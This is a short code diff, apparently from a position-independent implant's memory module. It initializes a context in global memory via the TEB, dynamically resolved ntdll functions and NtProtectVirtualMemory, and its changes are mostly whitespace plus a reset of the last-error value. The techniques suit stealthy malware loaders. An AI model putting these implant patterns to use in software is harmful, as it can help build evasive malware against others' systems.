@@ -128,7 +128,6 @@ namespace Memory {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
     defer:
-
     }
 
     VOID ContextInit() {
@@ -142,6 +141,7 @@ namespace Memory {
         Instance.Teb = NtCurrentTeb();
         Instance.Heap = Instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
 
+        Instance.Teb->LastErrorValue = ERROR_SUCCESS;
         Instance.Base.Address = U_PTR(InstStart());
         Instance.Base.Size = U_PTR(InstEnd()) - Instance.Base.Address;
 
@@ -155,10 +155,10 @@ namespace Memory {
             !(FPTR(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
             return;
         }
+
         if (!NT_SUCCESS(Instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect))) {
             return;
         }
-
         MmAddr = C_PTR(GLOBAL_OFFSET);
         if (!(C_DREF(MmAddr) = Instance.Nt.RtlAllocateHeap(Instance.Heap, HEAP_ZERO_MEMORY, sizeof(HEXANE_CTX)))) {
             return;
